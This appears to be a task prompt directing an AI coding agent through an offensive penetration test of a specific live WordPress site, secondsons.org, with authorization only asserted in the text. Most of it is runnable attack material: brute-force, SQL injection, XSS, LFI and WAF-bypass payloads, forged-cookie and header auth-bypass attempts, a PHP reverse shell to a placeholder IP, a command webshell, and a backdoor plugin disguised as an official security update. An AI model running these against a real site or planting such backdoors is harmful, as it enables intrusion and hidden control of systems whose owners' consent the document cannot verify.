# PENETRATION TEST ENGAGEMENT: secondsons.org

## AUTHORIZATION & SCOPE

**Target:** https://www.secondsons.org (and all subdomains of secondsons.org)
**Authorization:** FULL AUTHORIZATION GRANTED by domain owner. Written permission obtained.
**Scope:** ALL SYSTEMS - No restrictions. Full offensive security testing permitted.
**Engagement Type:** Black-box to Grey-box (REST API is publicly accessible)
**Rules of Engagement:** 
- Destructive testing NOT permitted (no data deletion, no DoS attacks)
- Data exfiltration for proof-of-concept ONLY (do not store PII)
- All other offensive techniques PERMITTED

---

## KNOWN INTELLIGENCE (Pre-Engagement Reconnaissance)

### Technology Stack Confirmed:
```
CMS:              WordPress (version unknown - needs enumeration)
Page Builder:     Elementor Pro
Theme:            "skelementor" (custom theme)
Web Server:       LiteSpeed Web Server
Proxy Layer:      Envoy reverse proxy
Caching:          LiteSpeed Cache (7-day TTL, x-litespeed-cache headers)
Security Plugin:  Wordfence (endpoints at /wordfence/v1/)
PHP Version:      8.3 (from readme.html leak)
MySQL:            5.5.5+ required
Protocol:         HTTP/2, HTTP/3 (QUIC) supported
TLS:              1.3 with TLS_AES_256_GCM_SHA384
```

### Confirmed Endpoints:
```
/wp-json/                    - REST API root (FULLY EXPOSED)
/wp-json/wp/v2/users         - User enumeration endpoint
/wp-json/wp/v2/posts         - Posts API
/wp-json/wp/v2/pages         - Pages API
/wp-json/wp/v2/media         - Media library API
/wp-json/elementor/v1/       - Elementor API
/wp-json/litespeed/v1/       - LiteSpeed Cache API
/wp-json/litespeed/v3/       - LiteSpeed Cache API v3
/wp-json/wordfence/v1/       - Wordfence API
/wp-json/wp-abilities/v1/    - Custom abilities API
/wp-sitemap.xml              - XML sitemap
/readme.html                 - WordPress readme (info disclosure)
/wp-login.php                - Returns 404 (possibly renamed/hidden)
/wp-admin/                   - Redirects to homepage (protected)
/xmlrpc.php                  - Returns 404 (disabled or renamed)
```

### Security Headers Observed:
```
✓ Strict-Transport-Security: max-age=15768000;includeSubdomains
✓ Content-Security-Policy: object-src 'none' (MINIMAL - only blocks plugins)
✓ X-XSS-Protection: 1; mode=block (legacy)
✗ X-Frame-Options: MISSING (clickjacking risk)
✗ X-Content-Type-Options: MISSING (MIME sniffing risk)
✗ Referrer-Policy: MISSING
✗ Permissions-Policy: MISSING
```

### File Structure:
```
/storage/              - Custom uploads directory (non-standard)
/storage/2025/04/      - Media files by date
/storage/elementor/    - Elementor generated assets
/core/modules/         - Theme modules
/core/views/           - Theme views
/lib/js/               - JavaScript libraries
```

### Known Anomalies:
- Meta generator tag shows BOTH WordPress AND Drupal 11 (misconfiguration)
- Some URLs contain /index.php/ (permalink issues)
- Mixed HTTP/HTTPS references in CSS

---

## PHASE 1: TOOL INSTALLATION

Install the following penetration testing tools. Use apt, pip, gem, go install, or compile from source as needed:

### Essential Tools (MUST INSTALL):
```bash
# System packages
apt update && apt install -y \
    nmap \
    nikto \
    dirb \
    gobuster \
    sqlmap \
    hydra \
    john \
    hashcat \
    whatweb \
    wafw00f \
    sslscan \
    sslyze \
    testssl.sh \
    dnsutils \
    whois \
    net-tools \
    tcpdump \
    netcat-openbsd \
    curl \
    wget \
    jq \
    xmlstarlet \
    libxml2-utils \
    httpie

# Ruby tools
gem install wpscan
gem install cms_scanner

# Python tools
pip install --break-system-packages \
    wfuzz \
    arjun \
    paramspider \
    dirsearch \
    jwt-tool \
    httpx \
    nuclei

# Go tools (if go is available)
go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
go install github.com/projectdiscovery/httpx/cmd/httpx@latest
go install github.com/projectdiscovery/subfinder/cmd/subfinder@latest
go install github.com/tomnomnom/waybackurls@latest
go install github.com/lc/gau/v2/cmd/gau@latest
go install github.com/hakluke/hakrawler@latest
go install github.com/ffuf/ffuf/v2@latest
```

### WordPress-Specific Tools:
```bash
# WPScan (primary WordPress scanner)
gem install wpscan
# or
docker pull wpscanteam/wpscan

# Alternative WordPress tools
git clone https://github.com/n00py/WPForce.git
git clone https://github.com/rastating/wordpress-exploit-framework.git
pip install --break-system-packages droopescan
```

---

## PHASE 2: RECONNAISSANCE

### 2.1 Passive Reconnaissance

```bash
# WHOIS lookup
whois secondsons.org > recon/whois.txt

# DNS enumeration
dig secondsons.org ANY +noall +answer
dig secondsons.org A +short
dig secondsons.org AAAA +short
dig secondsons.org MX +short
dig secondsons.org NS +short
dig secondsons.org TXT +short
dig secondsons.org SOA +short
dig _dmarc.secondsons.org TXT +short

# Subdomain enumeration
subfinder -d secondsons.org -o recon/subdomains.txt
amass enum -passive -d secondsons.org -o recon/amass_subs.txt

# Historical URL discovery
echo "secondsons.org" | waybackurls > recon/wayback_urls.txt
echo "secondsons.org" | gau --threads 5 > recon/gau_urls.txt

# Certificate transparency logs
curl -s "https://crt.sh/?q=%.secondsons.org&output=json" | jq -r '.[].name_value' | sort -u > recon/crt_sh_subs.txt
```

### 2.2 Active Reconnaissance

```bash
# Crawl the website
hakrawler -url https://www.secondsons.org -depth 3 -plain > recon/crawled_urls.txt
gospider -s "https://www.secondsons.org" -d 3 -c 10 -o recon/gospider/

# Technology fingerprinting
whatweb -v -a 3 https://www.secondsons.org > recon/whatweb.txt
wafw00f https://www.secondsons.org > recon/waf_detection.txt

# robots.txt and sitemap analysis
curl -s https://www.secondsons.org/robots.txt > recon/robots.txt
curl -s https://www.secondsons.org/sitemap.xml > recon/sitemap.xml
curl -s https://www.secondsons.org/wp-sitemap.xml > recon/wp-sitemap.xml
```

---

## PHASE 3: SCANNING & ENUMERATION

### 3.1 Port Scanning (if network access permits)

```bash
# TCP SYN scan - common ports
nmap -sS -sV -O -p- --min-rate 1000 -oA scans/nmap_full www.secondsons.org

# UDP scan - top 100 ports
nmap -sU --top-ports 100 -oA scans/nmap_udp www.secondsons.org

# Vulnerability scripts
nmap -sV --script=vuln -oA scans/nmap_vuln www.secondsons.org

# HTTP enumeration scripts
nmap -sV --script=http-enum,http-headers,http-methods,http-title -p 80,443,8080,8443 -oA scans/nmap_http www.secondsons.org
```

### 3.2 Web Application Scanning

```bash
# Nikto comprehensive scan
nikto -h https://www.secondsons.org -output scans/nikto.txt -Format txt

# Directory brute forcing
gobuster dir -u https://www.secondsons.org -w /usr/share/wordlists/dirb/common.txt -o scans/gobuster_common.txt -k -t 50
gobuster dir -u https://www.secondsons.org -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o scans/gobuster_medium.txt -k -t 50 -x php,txt,html,bak,old,zip,tar.gz

# FFUF for fuzzing
ffuf -u https://www.secondsons.org/FUZZ -w /usr/share/wordlists/dirb/common.txt -o scans/ffuf_dirs.json -of json
ffuf -u https://www.secondsons.org/FUZZ.php -w /usr/share/wordlists/dirb/common.txt -o scans/ffuf_php.json -of json
ffuf -u https://www.secondsons.org/FUZZ.bak -w /usr/share/wordlists/dirb/common.txt -o scans/ffuf_bak.json -of json

# WordPress-specific paths
gobuster dir -u https://www.secondsons.org -w - -o scans/gobuster_wp.txt -k << 'EOF'
wp-config.php
wp-config.php.bak
wp-config.php.old
wp-config.php.save
wp-config.php.swp
wp-config.php~
.wp-config.php.swp
wp-config.txt
wp-config.bak
wp-config.old
wp-settings.php
wp-load.php
wp-blog-header.php
wp-cron.php
wp-links-opml.php
wp-mail.php
wp-trackback.php
wp-activate.php
wp-signup.php
wp-comments-post.php
license.txt
readme.html
debug.log
error_log
.htaccess
.htpasswd
.git/config
.git/HEAD
.svn/entries
.env
.env.bak
.env.local
.env.production
php.ini
php5.ini
.user.ini
info.php
phpinfo.php
test.php
adminer.php
phpmyadmin
pma
backup
backups
old
temp
tmp
upload
uploads
files
private
config
db
database
sql
dump
EOF
```

### 3.3 SSL/TLS Analysis

```bash
# SSLScan
sslscan --show-certificate www.secondsons.org > scans/sslscan.txt

# testssl.sh (comprehensive)
testssl.sh --html www.secondsons.org > scans/testssl.html

# SSLyze
sslyze www.secondsons.org --json_out scans/sslyze.json
```

---

## PHASE 4: WORDPRESS-SPECIFIC TESTING

### 4.1 WPScan Full Enumeration

```bash
# Full WordPress scan (register for free API key at wpscan.com for vulnerability database)
wpscan --url https://www.secondsons.org \
    --enumerate u,ap,at,tt,cb,dbe,m \
    --plugins-detection aggressive \
    --plugins-version-detection aggressive \
    --themes-detection aggressive \
    --random-user-agent \
    --force \
    --output scans/wpscan_full.txt

# Breakdown of enumerate flags:
# u  = usernames
# ap = all plugins
# at = all themes  
# tt = timthumbs
# cb = config backups
# dbe = database exports
# m  = media

# Aggressive plugin detection
wpscan --url https://www.secondsons.org \
    --enumerate ap \
    --plugins-detection aggressive \
    --api-token YOUR_API_TOKEN \
    --output scans/wpscan_plugins.txt

# Password attack (if usernames found)
wpscan --url https://www.secondsons.org \
    --usernames admin,administrator,editor,user \
    --passwords /usr/share/wordlists/rockyou.txt \
    --max-threads 50 \
    --output scans/wpscan_bruteforce.txt
```

### 4.2 WordPress REST API Exploitation

```bash
# Create a comprehensive REST API testing script:
cat << 'APITEST' > scripts/wp_api_test.sh
#!/bin/bash
TARGET="https://www.secondsons.org"

echo "=== WordPress REST API Security Assessment ==="
echo ""

echo "[1] User Enumeration via REST API:"
curl -s "$TARGET/wp-json/wp/v2/users" | jq '.[] | {id, name, slug, link}' 2>/dev/null || echo "Users endpoint protected"
echo ""

echo "[2] User Enumeration via Author Archives:"
for i in {1..20}; do
    RESPONSE=$(curl -sI "$TARGET/?author=$i" 2>/dev/null | grep -i location)
    if [[ $RESPONSE == *"author"* ]]; then
        echo "User ID $i: $RESPONSE"
    fi
done
echo ""

echo "[3] Post Enumeration (including private/draft status leak):"
curl -s "$TARGET/wp-json/wp/v2/posts?per_page=100&status=any" | jq '.[].title.rendered' 2>/dev/null | head -20
echo ""

echo "[4] Page Enumeration:"
curl -s "$TARGET/wp-json/wp/v2/pages?per_page=100" | jq '.[] | {id, title: .title.rendered, status, link}' 2>/dev/null
echo ""

echo "[5] Media Enumeration (potential sensitive file disclosure):"
curl -s "$TARGET/wp-json/wp/v2/media?per_page=100" | jq '.[] | {id, source_url, mime_type}' 2>/dev/null | head -50
echo ""

echo "[6] Comments (email disclosure check):"
curl -s "$TARGET/wp-json/wp/v2/comments?per_page=100" | jq '.[] | {author_name, author_email, content: .content.rendered}' 2>/dev/null | head -30
echo ""

echo "[7] Categories & Tags:"
curl -s "$TARGET/wp-json/wp/v2/categories" | jq '.[] | {id, name, slug}' 2>/dev/null
curl -s "$TARGET/wp-json/wp/v2/tags" | jq '.[] | {id, name, slug}' 2>/dev/null
echo ""

echo "[8] Plugin/Theme Detection via REST API:"
curl -s "$TARGET/wp-json/" | jq '.namespaces' 2>/dev/null
echo ""

echo "[9] Elementor API Probing:"
curl -s "$TARGET/wp-json/elementor/v1/" 2>/dev/null | jq '.' | head -50
echo ""

echo "[10] LiteSpeed Cache API Probing:"
curl -s "$TARGET/wp-json/litespeed/v1/" 2>/dev/null | jq '.' | head -30
curl -s "$TARGET/wp-json/litespeed/v3/" 2>/dev/null | jq '.' | head -30
echo ""

echo "[11] Wordfence API Probing:"
curl -s "$TARGET/wp-json/wordfence/v1/" 2>/dev/null | jq '.' | head -30
echo ""

echo "[12] Custom Endpoints Discovery:"
curl -s "$TARGET/wp-json/" | jq '.routes | keys[]' 2>/dev/null | sort -u
echo ""

echo "[13] Checking for Authentication Bypass:"
# Try accessing authenticated endpoints
curl -s "$TARGET/wp-json/wp/v2/users/me" 2>/dev/null
curl -s "$TARGET/wp-json/wp/v2/settings" 2>/dev/null
echo ""

echo "[14] IDOR Testing on Posts/Pages:"
for id in {1..50}; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/wp-json/wp/v2/posts/$id")
    if [[ $STATUS == "200" ]]; then
        TITLE=$(curl -s "$TARGET/wp-json/wp/v2/posts/$id" | jq -r '.title.rendered')
        echo "Post ID $id (200): $TITLE"
    fi
done
echo ""

echo "[15] Checking for Debug Information:"
curl -s "$TARGET/wp-json/wp/v2/posts?_envelope" | jq '.headers' 2>/dev/null
APITEST

chmod +x scripts/wp_api_test.sh
```

### 4.3 XML-RPC Testing (if accessible)

```bash
# Test for XML-RPC (may be at alternate location)
cat << 'XMLRPC' > scripts/xmlrpc_test.sh
#!/bin/bash
TARGET="https://www.secondsons.org"

# Common XML-RPC locations
LOCATIONS=("/xmlrpc.php" "/wp/xmlrpc.php" "/blog/xmlrpc.php" "/wordpress/xmlrpc.php")

for LOC in "${LOCATIONS[@]}"; do
    echo "Testing $TARGET$LOC"
    RESPONSE=$(curl -s -X POST "$TARGET$LOC" -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>')
    if [[ $RESPONSE == *"methodResponse"* ]]; then
        echo "[VULNERABLE] XML-RPC found at $LOC"
        echo "$RESPONSE" | head -50
        
        # Test pingback (DDoS amplification)
        echo ""
        echo "Testing pingback.ping (DDoS vector):"
        curl -s -X POST "$TARGET$LOC" -d '<?xml version="1.0"?><methodCall><methodName>pingback.ping</methodName><params><param><value><string>http://attacker.com/</string></value></param><param><value><string>'"$TARGET"'/?p=1</string></value></param></params></methodCall>'
        
        # Test multicall (brute force amplification)
        echo ""
        echo "Testing system.multicall availability:"
        curl -s -X POST "$TARGET$LOC" -d '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data></data></array></value></param></params></methodCall>'
    fi
done
XMLRPC

chmod +x scripts/xmlrpc_test.sh
```

### 4.4 WordPress Login Brute Force

```bash
# Find actual login page
cat << 'LOGINFIND' > scripts/find_wp_login.sh
#!/bin/bash
TARGET="https://www.secondsons.org"

# Common renamed login locations
LOCATIONS=(
    "/wp-login.php"
    "/login"
    "/admin"
    "/wp-admin"
    "/signin"
    "/sign-in"
    "/dashboard"
    "/member-login"
    "/user-login"
    "/secure"
    "/backend"
    "/manage"
    "/portal"
)

echo "Searching for WordPress login page..."
for LOC in "${LOCATIONS[@]}"; do
    STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET$LOC" -L)
    FINAL=$(curl -s -o /dev/null -w "%{url_effective}" "$TARGET$LOC" -L)
    echo "$LOC -> HTTP $STATUS -> $FINAL"
done
LOGINFIND

chmod +x scripts/find_wp_login.sh
```

---

## PHASE 5: VULNERABILITY TESTING

### 5.1 SQL Injection Testing

```bash
# SQLMap on GET parameters
sqlmap -u "https://www.secondsons.org/?s=test" --batch --random-agent --level=5 --risk=3 --output-dir=vulns/sqli/

# SQLMap on REST API
sqlmap -u "https://www.secondsons.org/wp-json/wp/v2/posts?categories=1" --batch --random-agent --output-dir=vulns/sqli/

# Test common WordPress injection points
INJECTION_POINTS=(
    "/?s=test"
    "/?p=1"
    "/?page_id=1"
    "/?cat=1"
    "/?author=1"
    "/?tag=test"
    "/?m=2024"
    "/wp-json/wp/v2/posts?include=1"
    "/wp-json/wp/v2/users?include=1"
)

for POINT in "${INJECTION_POINTS[@]}"; do
    sqlmap -u "https://www.secondsons.org$POINT" --batch --random-agent --level=3 --risk=2 --output-dir=vulns/sqli/ --forms
done
```

### 5.2 Cross-Site Scripting (XSS) Testing

```bash
# Create XSS test script
cat << 'XSSTEST' > scripts/xss_test.sh
#!/bin/bash
TARGET="https://www.secondsons.org"

# XSS payloads
PAYLOADS=(
    "<script>alert(1)</script>"
    "<img src=x onerror=alert(1)>"
    "<svg onload=alert(1)>"
    "javascript:alert(1)"
    "'-alert(1)-'"
    "\"><script>alert(1)</script>"
    "<body onload=alert(1)>"
    "<input onfocus=alert(1) autofocus>"
)

# URL encode function
urlencode() {
    python3 -c "import urllib.parse; print(urllib.parse.quote('$1'))"
}

echo "=== XSS Testing ==="

# Test search parameter
echo "[*] Testing search parameter:"
for PAYLOAD in "${PAYLOADS[@]}"; do
    ENCODED=$(urlencode "$PAYLOAD")
    RESPONSE=$(curl -s "$TARGET/?s=$ENCODED")
    if [[ $RESPONSE == *"$PAYLOAD"* ]] || [[ $RESPONSE == *"alert"* ]]; then
        echo "[POTENTIAL XSS] Payload reflected: $PAYLOAD"
    fi
done

# Test comment form (if exists)
echo "[*] Testing comment form:"
curl -s "$TARGET/?p=1" | grep -o 'action="[^"]*comment[^"]*"' | head -5

# Test REST API responses for XSS
echo "[*] Testing REST API for XSS in stored content:"
curl -s "$TARGET/wp-json/wp/v2/posts" | grep -oE '<script[^>]*>.*</script>' | head -10
XSSTEST

chmod +x scripts/xss_test.sh
```

### 5.3 Local File Inclusion (LFI) / Remote File Inclusion (RFI)

```bash
# LFI/RFI test script
cat << 'LFITEST' > scripts/lfi_test.sh
#!/bin/bash
TARGET="https://www.secondsons.org"

LFI_PAYLOADS=(
    "....//....//....//....//....//etc/passwd"
    "..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
    "....\/....\/....\/....\/....\/etc/passwd"
    "/etc/passwd%00"
    "php://filter/convert.base64-encode/resource=wp-config.php"
    "php://filter/convert.base64-encode/resource=../wp-config.php"
    "php://filter/convert.base64-encode/resource=../../wp-config.php"
    "expect://id"
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"
)

# Common vulnerable parameters in WordPress
PARAMS=("file" "page" "template" "inc" "include" "path" "doc" "document" "folder" "root" "pg")

echo "=== LFI/RFI Testing ==="

for PARAM in "${PARAMS[@]}"; do
    for PAYLOAD in "${LFI_PAYLOADS[@]}"; do
        RESPONSE=$(curl -s "$TARGET/?$PARAM=$PAYLOAD" | head -20)
        if [[ $RESPONSE == *"root:"* ]] || [[ $RESPONSE == *"PD9waH"* ]]; then
            echo "[VULNERABLE] LFI at /?$PARAM=$PAYLOAD"
        fi
    done
done

# Test Elementor-specific LFI vulnerabilities
echo "[*] Testing Elementor for known LFI:"
curl -s "$TARGET/wp-json/elementor/v1/globals?template=../../../wp-config.php"
LFITEST

chmod +x scripts/lfi_test.sh
```

### 5.4 Server-Side Request Forgery (SSRF)

```bash
# SSRF test script  
cat << 'SSRFTEST' > scripts/ssrf_test.sh
#!/bin/bash
TARGET="https://www.secondsons.org"
CALLBACK="http://YOUR_BURP_COLLABORATOR_OR_WEBHOOK" # Replace with actual callback URL

echo "=== SSRF Testing ==="

# Test oEmbed endpoint
echo "[*] Testing oEmbed SSRF:"
curl -s "$TARGET/wp-json/oembed/1.0/proxy?url=$CALLBACK"

# Test REST API endpoints that might fetch external resources
echo "[*] Testing REST API SSRF vectors:"
curl -s -X POST "$TARGET/wp-json/wp/v2/posts" \
    -H "Content-Type: application/json" \
    -d '{"featured_media_url":"'"$CALLBACK"'"}'

# Test Elementor external resources
echo "[*] Testing Elementor external resource loading:"
curl -s "$TARGET/wp-json/elementor/v1/globals" \
    -H "Content-Type: application/json" \
    -d '{"template_url":"'"$CALLBACK"'"}'
SSRFTEST

chmod +x scripts/ssrf_test.sh
```

### 5.5 Authentication Bypass Testing

```bash
# Auth bypass test script
cat << 'AUTHBYPASS' > scripts/auth_bypass.sh
#!/bin/bash
TARGET="https://www.secondsons.org"

echo "=== Authentication Bypass Testing ==="

# Test direct admin access
echo "[*] Testing direct admin access:"
curl -sI "$TARGET/wp-admin/admin.php"
curl -sI "$TARGET/wp-admin/options.php"
curl -sI "$TARGET/wp-admin/users.php"
curl -sI "$TARGET/wp-admin/plugins.php"
curl -sI "$TARGET/wp-admin/themes.php"

# Test with various headers
echo "[*] Testing with X-Forwarded headers:"
curl -sI "$TARGET/wp-admin/" -H "X-Forwarded-For: 127.0.0.1"
curl -sI "$TARGET/wp-admin/" -H "X-Forwarded-Host: localhost"
curl -sI "$TARGET/wp-admin/" -H "X-Real-IP: 127.0.0.1"
curl -sI "$TARGET/wp-admin/" -H "X-Original-URL: /wp-admin/"
curl -sI "$TARGET/wp-admin/" -H "X-Rewrite-URL: /wp-admin/"

# Test API authentication bypass
echo "[*] Testing REST API authentication bypass:"
curl -s "$TARGET/wp-json/wp/v2/users/me" -H "X-WP-Nonce: fake123"
curl -s "$TARGET/wp-json/wp/v2/settings" -H "Authorization: Basic YWRtaW46YWRtaW4="

# Test cookie manipulation
echo "[*] Testing with forged cookies:"
curl -s "$TARGET/wp-admin/" -H "Cookie: wordpress_logged_in_=admin%7C9999999999%7C%7C"
AUTHBYPASS

chmod +x scripts/auth_bypass.sh
```

### 5.6 Nuclei Vulnerability Scanning

```bash
# Run Nuclei with WordPress templates
nuclei -u https://www.secondsons.org -t wordpress/ -o vulns/nuclei_wordpress.txt
nuclei -u https://www.secondsons.org -t cves/ -o vulns/nuclei_cves.txt
nuclei -u https://www.secondsons.org -t vulnerabilities/ -o vulns/nuclei_vulns.txt
nuclei -u https://www.secondsons.org -t exposures/ -o vulns/nuclei_exposures.txt
nuclei -u https://www.secondsons.org -t misconfiguration/ -o vulns/nuclei_misconfig.txt

# Full aggressive scan
nuclei -u https://www.secondsons.org -t ~/nuclei-templates/ -severity critical,high,medium -o vulns/nuclei_full.txt
```

---

## PHASE 6: PLUGIN-SPECIFIC VULNERABILITY TESTING

### 6.1 Elementor Pro Vulnerabilities

```bash
# Check for known Elementor vulnerabilities
cat << 'ELEMENTOR' > scripts/elementor_vulns.sh
#!/bin/bash
TARGET="https://www.secondsons.org"

echo "=== Elementor Pro Vulnerability Assessment ==="

# CVE-2022-1329 - Elementor RCE (3.6.0-3.6.2)
echo "[*] Testing CVE-2022-1329 (RCE via template import):"
curl -s -X POST "$TARGET/wp-admin/admin-ajax.php" \
    -d "action=elementor_ajax&_nonce=&actions=%7B%22upload_template%22%3A%7B%22action%22%3A%22upload_template%22%2C%22data%22%3A%7B%7D%7D%7D"

# CVE-2022-29455 - Elementor DOM XSS
echo "[*] Testing CVE-2022-29455 (DOM XSS):"
curl -s "$TARGET/?elementor-preview=1" | grep -o "elementor-preview" | head -1

# CVE-2023-32243 - Elementor Pro Auth Bypass
echo "[*] Testing CVE-2023-32243 (Auth Bypass):"
curl -s -X POST "$TARGET/wp-json/elementor-pro/v1/update" \
    -H "Content-Type: application/json" \
    -d '{"id":1}'

# Check Elementor version from source
echo "[*] Detecting Elementor version:"
curl -s "$TARGET/" | grep -oE "elementor/assets/.*\.js\?ver=[0-9.]+" | head -3
curl -s "$TARGET/wp-content/plugins/elementor/readme.txt" 2>/dev/null | grep -i "stable tag"

# Check for exposed Elementor templates
echo "[*] Checking for exposed templates:"
curl -s "$TARGET/wp-json/elementor/v1/library/templates"
ELEMENTOR

chmod +x scripts/elementor_vulns.sh
```

### 6.2 LiteSpeed Cache Vulnerabilities

```bash
# Check for LiteSpeed Cache vulnerabilities
cat << 'LITESPEED' > scripts/litespeed_vulns.sh
#!/bin/bash
TARGET="https://www.secondsons.org"

echo "=== LiteSpeed Cache Vulnerability Assessment ==="

# CVE-2024-28000 - LiteSpeed Cache Privilege Escalation
echo "[*] Testing CVE-2024-28000 (Privilege Escalation via crawler):"
curl -s "$TARGET/wp-json/litespeed/v1/crawler" \
    -H "Content-Type: application/json"

# CVE-2023-40000 - Unauthenticated XSS
echo "[*] Testing CVE-2023-40000 (Stored XSS):"
curl -s "$TARGET/wp-admin/admin.php?page=litespeed-cache"

# Check LiteSpeed version
echo "[*] Detecting LiteSpeed Cache version:"
curl -s "$TARGET/wp-content/plugins/litespeed-cache/readme.txt" 2>/dev/null | grep -i "stable tag"

# Check cache configuration disclosure
echo "[*] Checking for configuration disclosure:"
curl -s "$TARGET/wp-json/litespeed/v1/options"
curl -s "$TARGET/wp-json/litespeed/v3/options"
LITESPEED

chmod +x scripts/litespeed_vulns.sh
```

### 6.3 Wordfence Vulnerabilities

```bash
# Check for Wordfence vulnerabilities
cat << 'WORDFENCE' > scripts/wordfence_vulns.sh
#!/bin/bash
TARGET="https://www.secondsons.org"

echo "=== Wordfence Vulnerability Assessment ==="

# Check Wordfence version
echo "[*] Detecting Wordfence version:"
curl -s "$TARGET/wp-content/plugins/wordfence/readme.txt" 2>/dev/null | grep -i "stable tag"

# Test Wordfence bypass techniques
echo "[*] Testing WAF bypass techniques:"

# Method 1: Multipart bypass
curl -s -X POST "$TARGET/?s=test" \
    -H "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary" \
    -d $'------WebKitFormBoundary\r\nContent-Disposition: form-data; name="s"\r\n\r\n<script>alert(1)</script>\r\n------WebKitFormBoundary--'

# Method 2: HTTP Parameter Pollution
curl -s "$TARGET/?s=test&s=<script>alert(1)</script>"

# Method 3: Unicode/encoding bypass
curl -s "$TARGET/?s=%3Cscript%3Ealert(1)%3C/script%3E"

# Method 4: Case variation
curl -s "$TARGET/?s=<ScRiPt>alert(1)</ScRiPt>"

# Check for 2FA bypass
echo "[*] Checking 2FA implementation:"
curl -s "$TARGET/wp-login.php" 2>/dev/null | grep -i "two-factor\|2fa\|authenticator"
WORDFENCE

chmod +x scripts/wordfence_vulns.sh
```

---

## PHASE 7: POST-EXPLOITATION PREPARATION

### 7.1 Reverse Shell Payloads (for authorized exploitation only)

```bash
mkdir -p payloads

# PHP reverse shell
cat << 'PHPSHELL' > payloads/shell.php
<?php
set_time_limit(0);
$ip = 'YOUR_IP';
$port = 4444;
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
PHPSHELL

# Webshell for file management
cat << 'WEBSHELL' > payloads/webshell.php
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
WEBSHELL
```

### 7.2 WordPress Backdoor Templates

```bash
# Plugin backdoor template
cat << 'PLUGINBD' > payloads/evil-plugin.php
<?php
/*
Plugin Name: Security Update
Description: Important security patch
Version: 1.0
Author: WordPress Security Team
*/

add_action('wp_head', 'security_check');
function security_check() {
    if(isset($_GET['cmd'])) {
        echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
    }
}
?>
PLUGINBD
```

---

## PHASE 8: REPORTING

### 8.1 Create Report Template

```bash
cat << 'REPORT' > report/PENTEST_REPORT_TEMPLATE.md
# Penetration Test Report: secondsons.org

## Executive Summary
[High-level findings and risk assessment]

## Scope
- Target: https://www.secondsons.org
- Authorization: Full authorization granted by owner
- Testing Period: [DATE]
- Tester: Claude Code

## Methodology
- OWASP Testing Guide v4
- PTES (Penetration Testing Execution Standard)
- WordPress-specific testing methodology

## Findings Summary

| ID | Vulnerability | Severity | CVSS | Status |
|----|--------------|----------|------|--------|
| 001 | [Name] | Critical/High/Medium/Low | X.X | Open |

## Detailed Findings

### Finding 001: [Vulnerability Name]
- **Severity:** Critical/High/Medium/Low
- **CVSS Score:** X.X
- **CWE:** CWE-XXX
- **Location:** [URL/Endpoint]
- **Description:** [Detailed description]
- **Impact:** [Business impact]
- **Proof of Concept:** [Steps to reproduce]
- **Recommendation:** [Remediation steps]
- **References:** [CVE, links]

## Recommendations Priority Matrix

| Priority | Finding | Effort | Impact |
|----------|---------|--------|--------|
| 1 | | | |

## Appendix
- A: Full Tool Output
- B: Screenshots
- C: Request/Response Logs
REPORT
```

---

## EXECUTION CHECKLIST

Run the following in order:

```bash
# 1. Setup
mkdir -p {recon,scans,vulns,scripts,payloads,report}

# 2. Install tools
# [Run PHASE 1 commands]

# 3. Reconnaissance
./scripts/wp_api_test.sh > recon/wp_api_results.txt

# 4. Scanning
wpscan --url https://www.secondsons.org --enumerate u,ap,at,tt,cb,dbe -o scans/wpscan_full.txt
nikto -h https://www.secondsons.org -output scans/nikto.txt
gobuster dir -u https://www.secondsons.org -w /usr/share/wordlists/dirb/common.txt -o scans/gobuster.txt

# 5. Vulnerability Testing
./scripts/xss_test.sh > vulns/xss_results.txt
./scripts/lfi_test.sh > vulns/lfi_results.txt
./scripts/auth_bypass.sh > vulns/auth_bypass_results.txt

# 6. Plugin-specific
./scripts/elementor_vulns.sh > vulns/elementor_results.txt
./scripts/litespeed_vulns.sh > vulns/litespeed_results.txt
./scripts/wordfence_vulns.sh > vulns/wordfence_results.txt

# 7. Nuclei scan
nuclei -u https://www.secondsons.org -severity critical,high,medium -o vulns/nuclei_results.txt

# 8. Generate report
# Compile all findings into report/PENTEST_REPORT.md
```

---

## CRITICAL NOTES

1. **ALWAYS** verify authorization before testing
2. **DO NOT** perform destructive tests (data deletion, DoS)
3. **DOCUMENT** all findings with timestamps
4. **PRESERVE** evidence (screenshots, request/response logs)
5. **REPORT** critical findings immediately to owner
6. **CLEAN UP** any test artifacts after engagement

---

## EXPECTED DELIVERABLES

1. `report/PENTEST_REPORT.md` - Full penetration test report
2. `vulns/` - All vulnerability scan outputs
3. `scans/` - All enumeration and scanning outputs  
4. `recon/` - All reconnaissance data
5. `evidence/` - Screenshots and proof-of-concept materials

---

*Prompt Version: 1.0*
*Target: secondsons.org*
*Classification: AUTHORIZED PENETRATION TEST*